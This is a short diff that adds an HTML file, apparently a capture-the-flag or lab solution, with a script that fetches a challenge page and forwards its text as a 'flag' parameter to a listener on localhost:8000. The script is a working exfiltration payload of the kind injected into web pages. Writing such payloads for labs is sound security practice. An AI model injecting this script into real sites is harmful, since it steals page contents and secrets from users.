@@ -1,0 +1,5 @@
+<!-- part 2: We must fetch (default makes a get request), then the response which is a promse, get the text of that... which is also a promise-->
+
+<script>
+	fetch('http://challenge.localhost:80/gateway').then(response => response.text()).then(website_content => fetch(`http://localhost:8000/?flag=${website_content}`))
+</script>
